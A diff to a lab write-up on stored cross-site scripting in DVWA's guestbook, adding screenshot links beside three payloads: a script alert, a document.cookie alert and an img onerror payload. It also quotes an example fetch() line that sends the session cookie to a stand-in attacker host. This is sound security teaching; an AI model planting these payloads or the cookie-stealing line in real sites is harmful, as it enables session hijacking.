@@ -14,7 +14,11 @@ Show that unsanitized input isn't just displayed as text — it gets executed as
 - Name: `hello`
 - Message: `<script>alert('hello')</script>`
 
+![hello](./ss-1.1-hello.png)
+
 **Result:** submitting the form immediately triggered a popup box reading "hello."
+
+![hello](./ss-1.2-hello.png)
 
 **Why it worked:** the guestbook saves the Message field and re-renders it directly into the page's HTML with no encoding or filtering. The browser doesn't know the difference between "text the site wants me to display" and "a script tag the site wants me to run" — it just parses whatever HTML it's given. Because DVWA echoes the raw input back into the page, my `<script>` tag becomes real, executable HTML instead of inert text.
 
@@ -28,7 +32,11 @@ Show that unsanitized input isn't just displayed as text — it gets executed as
 - Name: `cookie`
 - Message: `<script>alert(document.cookie)</script>`
 
+![hello](./ss-2.1-cookie.png)
+
 **Result:** popup displayed the live session cookie: `PHPSESSID=8e5i49iackkgukc0drkipket04; security=low`
+
+![hello](./ss-2.2-cookie.png)
 
 **Why this matters more than Payload 1:** `document.cookie` is a real browser API that exposes the current page's cookies to any script running on it — including mine. In this proof-of-concept, the payload just pops the cookie in an alert box. In a real attack, the payload would instead silently send that cookie to an attacker-controlled server (e.g. `<script>fetch('https://attacker.site/steal?c='+document.cookie)</script>`), which the attacker could then use to impersonate the victim's logged-in session without ever knowing their password. This is the mechanism behind real-world session hijacking via XSS.
 
@@ -40,7 +48,12 @@ Show that unsanitized input isn't just displayed as text — it gets executed as
 - Name: `alert`
 - Message: `<img src=x onerror="alert('xss2')">`
 
+![hello](./ss-3.1-xss.png)
+
 **Result:** popup displayed "xss2," confirming the payload executed without using a `<script>` tag at all.
+
+![hello](./ss-3.2-xss.png)
+![hello](./ss-3.3-xss.png)
 
 **Why this matters:** some real-world defenses specifically strip or block `<script>` tags but forget that virtually any HTML tag with an event handler attribute (`onerror`, `onload`, `onclick`, etc.) can execute JavaScript too. This payload deliberately points an `<img>` tag at a broken source (`src=x`, which doesn't exist), so the browser's `onerror` event fires — and whatever JavaScript is in that attribute runs. This demonstrates that XSS filtering has to account for far more than just one tag name to be effective.
 
